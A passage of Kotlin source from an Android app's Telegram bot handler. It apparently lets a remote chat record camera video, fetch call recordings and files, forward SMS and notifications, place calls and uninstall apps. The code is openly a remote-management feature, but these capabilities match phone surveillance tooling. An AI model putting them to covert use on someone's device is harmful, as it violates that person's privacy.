                        showVideoCameraMenu(editMessageId = messageId)
                    }
                    "vid_custom" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "video_duration:${if (rest == "front") "front" else "back"}"
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 <b>Custom video duration</b> · ${if (rest == "front") "🤳 Front" else "📷 Back"} camera\n\nReply with the number of <b>seconds</b> to record (1–120).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                        )
                    }
                    "vid" -> {
                        // rest = "<cam>:<seconds>"
                        val sep = rest.indexOf(':')
                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId); return@launch }
                        val cam = rest.substring(0, sep)
                        val n = rest.substring(sep + 1).toIntOrNull()?.coerceIn(1, 120) ?: 10
                        val useFront = cam == "front"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 Recording <b>${n}s</b> · ${if (useFront) "🤳 Front" else "📷 Back"} camera…"
                        )
                        runVideoRecording(n, useFront)
                    }
                    "rec_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending recording…")
                        cbSendRecording(rest)
                    }
                    "rec_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderRecordingsPage(q, off, editMessageId = messageId)
                    }
                    "rec_q" -> {
                        pendingInput = "rec_search"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send a name or number to search recordings (or * to show all)…")
                    }
                    "rec_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val filename = recFromToken(rest)
                        if (filename == null) {
                            sendMessage("❌ Recording not found — please refresh the list.")
                            return@launch
                        }
                        val meta = CallRecorderHelper.list().firstOrNull { it.filename == filename }
                        val resolvedName = meta?.let {
                            it.displayName.ifBlank { lookupContactName(it.source) }
                        } ?: ""
                        val label = resolvedName.ifBlank { filename }
                        val dur = meta?.let { formatDuration(it.durationMs) } ?: ""
                        val confirmText = "🗑 <b>Delete recording?</b>\n\n" +
                            "<b>${htmlEsc(label)}</b>${if (dur.isNotBlank()) "  ·  $dur" else ""}\n\n" +
                            "<i>This cannot be undone.</i>"
                        val markup = TelegramApiClient.inlineKeyboard(listOf(
                            listOf("✅ Yes, delete" to "rec_del_ok:$rest", "❌ Cancel" to "rec_del_no"),
                        ))
                        sendMessage(confirmText, replyMarkup = markup)
                    }
                    "rec_del_ok" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        val filename = recFromToken(rest)
                        if (filename == null) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Recording not found.")
                            return@launch
                        }
                        val deleted = CallRecorderHelper.deleteByFilename(filename)
                        if (messageId != null) {
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                if (deleted) "✅ Recording deleted." else "❌ Could not delete the recording."
                            )
                        }
                        if (deleted) renderRecordingsPage(lastRecQuery, 0, editMessageId = null)
                    }
                    "rec_del_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Deletion cancelled.")
                    }
                    // ---------- Now Playing controls ----------
                    "np_play" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.play()
                        kotlinx.coroutines.delay(200)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_pause" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.pause()
                        kotlinx.coroutines.delay(200)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_next" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.skipToNext()
                        kotlinx.coroutines.delay(400)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_prev" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.skipToPrevious()
                        kotlinx.coroutines.delay(400)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    // ---------- Block number controls ----------
                    "bn_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val num = phoneFromToken(rest) ?: run {
                            sendMessage("❌ Number not found — refresh the list."); return@launch
                        }
                        BlockedNumberHelper.delete(num)
                        renderBlockNumberPage(editMessageId = messageId)
                    }
                    "bn_add" -> {
                        pendingInput = "bn_add_num"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send the phone number to block…")
                    }
                    "bn_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBlockNumberPage(editMessageId = messageId)
                    }
                    // ---------- Now Playing refresh ----------
                    "np_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "music_cmd" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderMusicPage("", 0, editMessageId = null)
                    }
                    // ---------- SMS forward toggle ----------
                    "smsfwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        forwardSmsEnabled = true
                        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, true) }
                        val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off")))
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "📩 <b>SMS Forwarding</b>\nStatus: ✅ <b>ON</b> — incoming SMS will be forwarded to this chat", replyMarkup = markup)
                    }
                    "smsfwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        forwardSmsEnabled = false
                        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, false) }
                        val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off")))
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "📩 <b>SMS Forwarding</b>\nStatus: 🔕 <b>OFF</b> — SMS forwarding is paused", replyMarkup = markup)
                    }
                    // ---------- DND toggle ----------
                    "dnd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        if (nm.isNotificationPolicyAccessGranted) {
                            nm.setInterruptionFilter(android.app.NotificationManager.INTERRUPTION_FILTER_NONE)
                            val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off")))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔇 <b>Do Not Disturb</b>\nStatus: 🔇 <b>ON</b> (all calls and notifications silenced)", replyMarkup = markup)
                        }
                    }
                    "dnd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        if (nm.isNotificationPolicyAccessGranted) {
                            nm.setInterruptionFilter(android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
                            val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off")))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔇 <b>Do Not Disturb</b>\nStatus: 🔔 <b>OFF</b> (notifications active)", replyMarkup = markup)
                        }
                    }
                    "contacts_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderContactsPage(q, off, editMessageId = messageId)
                    }
                    "c_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        // rest = "<rawId>:<q>:<offset>" — we only need rawId; the back state is tracked globally.
                        val rawId = rest.substringBefore(':')
                        renderContactDetail(rawId, editMessageId = messageId)
                    }
                    "c_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderContactsPage(lastContactsQuery, lastContactsOffset, editMessageId = messageId)
                    }
                    "c_call" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            try {
                                CallMediaStoreHelper.call(MainApp.instance, num)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "📞 Calling $num…")
                                sendMessage("📞 Placing call to <code>${htmlEsc(num)}</code> on the device.\n<i>If nothing happens, grant the Phone (CALL_PHONE) permission in PlainApp.</i>")
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true)
                                sendMessage("❌ Could not place call: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "c_sms" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "sms_to:${phoneToken(num)}"
                            sendMessage("💬 <b>Send SMS to <code>${htmlEsc(num)}</code></b>\n\nReply with the message text.\nSend any /command to cancel.")
                        }
                    }
                    "c_share" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sharing contact…")
                        cbShareContact(rest)
                    }
                    "nf_call" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            try {
                                CallMediaStoreHelper.call(MainApp.instance, num)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "📞 Calling $num…")
                                sendMessage("📞 Placing call to <code>${htmlEsc(num)}</code> on the device.\n<i>If nothing happens, grant the Phone (CALL_PHONE) permission in PlainApp.</i>")
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true)
                                sendMessage("❌ Could not place call: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "nf_sms" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "sms_to:${phoneToken(num)}"
                            sendMessage("💬 <b>Send SMS to <code>${htmlEsc(num)}</code></b>\n\nReply with the message text.\nSend any /command to cancel.")
                        }
                    }
                    "cl_open" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔍 Looking up…")
                            // Re-use the /find flow: opens the contact detail when the
                            // number is in the address book, or falls back to the
                            // unknown-number panel (Call / SMS / Save) when it isn't.
                            cmdFind(listOf(num))
                        }
                    }
                    "nf_save" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "save_contact:${phoneToken(num)}"
                            sendMessage("💾 <b>Save <code>${htmlEsc(num)}</code> as a new contact</b>\n\nReply with the contact's name (e.g. <i>John Doe</i>).\nSend any /command to cancel.")
                        }
                    }
                    "auto_run" -> {
                        // rest = first 20 chars of rule UUID
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            try {
                                val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
                                TelegramApiClient.answerCallbackQuery(
                                    token, cqId,
                                    if (started) "▶ ${rule.name}" else "⚠ Skipped (disabled / cooldown)",
                                    !started,
                                )
                            } catch (e: Throwable) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                            }
                        }
                    }
                    "auto_tog" -> {
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            val updated = rule.copy(enabled = !rule.enabled)
                            AutomationHelper.upsert(updated)
                            TelegramApiClient.answerCallbackQuery(
                                token, cqId,
                                "${if (updated.enabled) "🟢 ON" else "⚪ OFF"}: ${rule.name}",
                            )
                            cmdAutomations()
                        }
                    }
                    "auto_del" -> {
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            com.ismartcoding.plain.helpers.AutomationScheduler.cancel(rule.id, MainApp.instance)
                            AutomationHelper.delete(rule.id, MainApp.instance)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Deleted ${rule.name}")
                            cmdAutomations()
                        }
                    }
                    "auto_engine" -> {
                        val on = rest == "1"
                        AutomationHelper.setEnabled(on, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, if (on) "Engine ON" else "Engine OFF")
                        cmdAutomations()
                    }
                    "block_list" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderAppPickerForBlock(query = "", offset = off, editMessageId = messageId)
                    }
                    "block_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBlockActionMenu(rest, messageId)
                    }
                    "block_now" -> {
                        AppBlockHelper.setBlocked(rest, true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Blocked", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🚫 <b>${htmlEsc(rest)}</b> is now blocked.\n\nUse /unblockapp or tap below.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Unblock now" to "unblock:${rest.take(55)}")))
                        )
                    }
                    "block_lim" -> {
                        val parts = rest.split(":")
                        if (parts.size < 2) return@launch
                        val pkg = parts[0]
                        val mins = parts[1].toIntOrNull() ?: 0
                        AppBlockHelper.setTimeLimit(pkg, mins * 60_000L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit set to ${mins} min/day")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "⏱ <b>${htmlEsc(pkg)}</b> limited to <b>${mins} min/day</b>.\nIt will be blocked once today's usage exceeds the limit.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✕ Clear limit" to "limit_clr:${pkg.take(50)}")))
                        )
                    }
                    "limit_clr" -> {
                        AppBlockHelper.setTimeLimit(rest, 0L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit cleared")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "unblock" -> {
                        AppBlockHelper.setBlocked(rest, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "notif_mute" -> {
                        forwardNotifications = false
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Notifications muted", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🔕 <b>Notification forwarding muted.</b>\nSend <code>/mutenotifs off</code> to resume.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔔 Resume forwards" to "notif_unmute")))
                        )
                    }
                    "notif_unmute" -> {
                        forwardNotifications = true
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Notifications resumed", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🔔 <b>Notification forwarding resumed.</b>\nNew device notifications will appear here again.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔕 Mute again" to "notif_mute")))
                        )
                    }
                    // ---- /apps modern picker ----
                    "apps_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderAppsPickerPage(lastAppsQuery, off, editMessageId = messageId)
                    }
                    "apps_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send the search text…")
                        pendingInput = "appsearch"
                        sendMessage("🔍 Send a name fragment to search apps (e.g. <code>chrome</code>), or send <code>*</code> to clear.")
                    }
                    "appd" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ App session expired. Send /apps to start over.")
                        } else {
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appl" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.launch(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Launching ${pkg}", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Launch failed: ${e.message}", true)
                            }
                        }
                    }
                    "appst" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.viewInSettings(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Opened settings", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "appblock" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setBlocked(pkg, true)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Blocked", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appunblock" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setBlocked(pkg, false)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "applimit" -> {
                        val parts = rest.split(":")
                        val pkg = parts.getOrNull(0)?.let { pkgFromToken(it) }
                        val mins = parts.getOrNull(1)?.toIntOrNull() ?: 0
                        if (pkg == null || mins <= 0) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Bad limit", true)
                        } else {
                            AppBlockHelper.setTimeLimit(pkg, mins * 60_000L)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Limited to ${mins} min/day", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appclim" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            AppBlockHelper.setTimeLimit(pkg, 0L)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Limit cleared", false)
                            renderAppDetail(pkg, editMessageId = messageId)
                        }
                    }
                    "appapk" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading APK…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ App session expired. Send /apps to start over.")
                        } else {
                            try {
                                val info = PackageHelper.searchAsync(
                                    "ids:$pkg", 1, 0,
                                    com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
                                ).firstOrNull()
                                if (info == null) sendMessage("❌ App not found.")
                                else if (info.path.isBlank()) sendMessage("❌ APK file path unavailable for <code>${htmlEsc(pkg)}</code>.")
                                else cbSendFile(info.path)
                            } catch (e: Exception) {
                                sendMessage("❌ Failed: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "appicn" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending icon…")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ App session expired. Send /apps to start over.")
                        } else {
                            sendAppIcon(pkg)
                        }
                    }
                    "appcp" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                val cm = MainApp.instance.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                                cm.setPrimaryClip(android.content.ClipData.newPlainText("package", pkg))
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Copied to device clipboard", false)
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "appu" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ App session expired. Send /apps to start over.")
                        } else {
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                "🗑 <b>Uninstall ${htmlEsc(pkg)}?</b>\n\nThe Android system uninstall dialog will pop up on the device — you must confirm there too.",
                                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                                    listOf("✅ Yes, prompt on device" to "appuok:$rest"),
                                    listOf("◀️ Cancel" to "appd:$rest"),
                                ))
                            )
                        }
                    }
                    "appuok" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            try {
                                PackageHelper.uninstall(MainApp.instance, pkg)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Confirm on device")
                                TelegramApiClient.editMessageText(
                                    token, chatId, messageId,
                                    "🗑 Uninstall dialog opened on the device for <code>${htmlEsc(pkg)}</code>.\nConfirm there to complete removal.",
                                    replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("◀️ Back to apps" to "apps_pg:0")))
                                )
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message}", true)
                            }
                        }
                    }
                    "files_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tok = rest.substring(0, sep)
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        val path = pathFromToken(tok)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFolderPage(path, off, editMessageId = messageId)
                        }
                    }
                    "file_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val path = pathFromToken(rest)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFileView(path, editMessageId = messageId)
                        }
                    }
                    "file_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading file…")
                        val path = pathFromToken(rest)
                        if (path == null) {
                            sendMessage("⚠️ Path session expired. Send /files to start over.")
                        } else {
                            cbSendFile(path)
                        }
                    }
                    // ---- Notes ----
                    "notes_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderNotesPage(q, off, editMessageId = messageId)
                    }
                    "note_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading note…")
                        renderNoteDetail(rest, editMessageId = messageId)
                    }
                    "note_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    "note_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, trash it" to "note_del_ok:$rest", "✕ Cancel" to "note_view:$rest"),
                                listOf("⬅️ Back to list" to "note_back"),
                            ))
                        )
                    }
                    "note_del_ok" -> {
                        try {
                            NoteHelper.trashAsync(setOf(rest))
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Note trashed")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    // ---- Bookmarks ----
                    "bm_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderBookmarksPage(q, off, editMessageId = messageId)
                    }
                    "bm_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarkDetail(rest, editMessageId = messageId)
                    }
                    "bm_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, delete" to "bm_del_ok:$rest", "✕ Cancel" to "bm_view:$rest"),
                            ))
                        )
                    }
                    "bm_del_ok" -> {
                        try {
                            BookmarkHelper.deleteBookmarks(setOf(rest), MainApp.instance)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Bookmark deleted")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_open" -> {
                        try {
                            val bm = BookmarkHelper.getById(rest)
                            if (bm == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Not found", true); return@launch }
                            BookmarkHelper.recordClick(rest)
                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(bm.url))
                            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            MainApp.instance.startActivity(intent)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🌐 Opened on device")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                    }
                    // ---- Feeds ----
                    "feed_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entries…")
                        renderFeedEntriesPage(rest, 0, editMessageId = messageId)
                    }
                    "feeds_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderFeedsList(editMessageId = messageId)
                    }
                    "fe_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val feedId = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(feedId, off, editMessageId = messageId)
                    }
                    "fe_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entry…")
                        renderFeedEntryDetail(rest, editMessageId = messageId)
                    }
                    "fe_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val feedId = if (sep < 0) rest else rest.substring(0, sep)
                        val off = if (sep < 0) 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(if (feedId == "_") "" else feedId, off, editMessageId = messageId)
                    }
                    // ---- Music / videos / images ----
                    "mus_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderMusicPage(q, off, editMessageId = messageId)
                    }
                    "mus_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending audio…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Track session expired. Send /music again.")
                        else cbSendMediaAudio(path)
                    }
                    "vds_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderVideosPage(q, off, editMessageId = messageId)
                    }
                    "vds_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending video…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Video session expired. Send /videos again.")
                        else cbSendMediaVideo(path)
                    }
                    "img_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderImagesPage(q, off, editMessageId = messageId)
                    }
                    "img_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending photo…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Image session expired. Send /images again.")
                        else cbSendMediaImage(path)
                    }
                    // ---- Pomodoro ----
                    "pom_start" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "▶️ Starting…")
                        val secs = try {
